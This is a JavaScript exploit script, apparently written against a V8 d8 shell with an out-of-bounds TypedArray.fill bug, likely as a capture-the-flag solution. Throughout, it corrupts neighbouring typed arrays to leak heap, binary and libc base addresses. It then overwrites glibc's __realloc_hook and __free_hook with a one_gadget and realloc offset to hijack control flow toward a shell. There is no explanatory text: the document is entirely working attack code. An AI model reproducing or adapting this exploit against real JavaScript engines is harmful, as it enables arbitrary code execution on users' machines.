function addr64(loAddr, hiAddr){ return loAddr + hiAddr*0x100000000;}
function lo32(addr) {return (addr >>> 32);}
function hi32(addr) {return (addr-lo32(addr)) /0x100000000;}

var i = 0;

//typedArray = new TypedArray(2);
corruptedArray = new Uint32Array([0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41]);
leakedArray1 = new Uint32Array([0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42]);
leakedArray2 = new Uint32Array([0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43]);
overwriteArray = new Uint32Array([0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44]);
overwriteArray1 = new Uint32Array([0x45, 0x45, 0x45, 0x45, 0x45, 0x45, 0x45, 0x45]);
//arrBuffer = new ArrayBuffer(0x20);
//arrBuffer[0] = corruptedArray;
//arrBuffer[1] = leakedArray;
corruptedArray.fill(0x3ff, 0x10, 0x11)
var heapBaseValue = addr64(corruptedArray[0x12], corruptedArray[0x13]) - 7;


//console.log(corruptedArray.length)
console.log("heap base address: 0x"+heapBaseValue.toString(16));
leakedArray1.fill(0xf0, 0x10, 0x11);
leakedArray1.fill(0x40001, 0x14, 0x15);
//corruptedArray.fill(0x40001, 0x80, 0x81)
//console.log(leakedArray1.length);
d8LeakedAddress = addr64(leakedArray1[2], leakedArray1[3]);
console.log("d8 address: 0x"+ d8LeakedAddress.toString(16));
d8BaseAddress = d8LeakedAddress - 0x1510820;

leakLibcAddress = heapBaseValue + 0x1570;//d8BaseAddress + 0x1494848;
console.log("puts address: 0x"+ leakLibcAddress.toString(16));
console.log("hi address: 0x"+hi32(leakLibcAddress).toString(16));
console.log("lo address: 0x"+lo32(leakLibcAddress).toString(16));

corruptedArray.fill(hi32(leakLibcAddress), 0xed, 0xee);
corruptedArray.fill(lo32(leakLibcAddress)+1, 0xee, 0xef);
leakedArray2.fill(0xf0, 0x10, 0x11);
leakedArray2.fill(lo32(leakLibcAddress)+1, 0x14, 0x15)
//console.log(leakedArray2[0]);
//console.log(leakedArray2[1]);

leakedPrintAddress = addr64(leakedArray2[0], leakedArray2[1]);
libcBaseAddress = leakedPrintAddress - 0x58560;
console.log("Libc base address: 0x" + libcBaseAddress.toString(16));
//corruptedArray.fill(hi32(putsAddress), 0x7f, 0x80);
//leakedArray.fill(0xf0, 0x10, 0x11);
//arrBuffer = new ArrayBuffer(leakedArray);
//newArray = new Uint32Array(arrBuffer);
//console.log(leakedArray[0]);
//console.log(newArray[0]);
//corruptedArray.fill(hi32(putsAddress), 0x13, 0x14);
//corruptedArray.fill(lo32(putsAddress) & 0xffff0000, 0x14, 0x15);

reallocHookAddress =  libcBaseAddress +  0x1bbc30 - 0x10; 
console.log("Realloc_Hook address: 0x" + reallocHookAddress.toString(16));
corruptedArray.fill(hi32(reallocHookAddress), 0x15a, 0x15b);
corruptedArray.fill(lo32(reallocHookAddress)+1, 0x15b, 0x15c);
overwriteArray.fill(0xf0, 0x10, 0x11);
//overwriteArray.fill(lo32(freeHookAddress), 0x14, 0x15);
oneGadgetAddress = libcBaseAddress + 0xe5456;
overwriteArray[0]=lo32(oneGadgetAddress);
overwriteArray[1]=hi32(oneGadgetAddress);
overwriteArray.fill(0x0, 0x10, 0x11);
//
freeHookAddress = libcBaseAddress + 0x1bd8e8-8;
corruptedArray.fill(hi32(freeHookAddress), 0x1c7, 0x1c8);
corruptedArray.fill(lo32(freeHookAddress)+1, 0x1c8, 0x1c9);
overwriteArray1.fill(0xf0, 0x10, 0x11);
reallocOffset = libcBaseAddress + 0x84bf9;
console.log("realloc offset: 0x"+reallocOffset.toString(16));
overwriteArray1.fill(lo32(reallocOffset), 0, 1);overwriteArray1.fill(hi32(reallocOffset), 1, 2);
//console.log("1");
//console.log("/bin/sh");
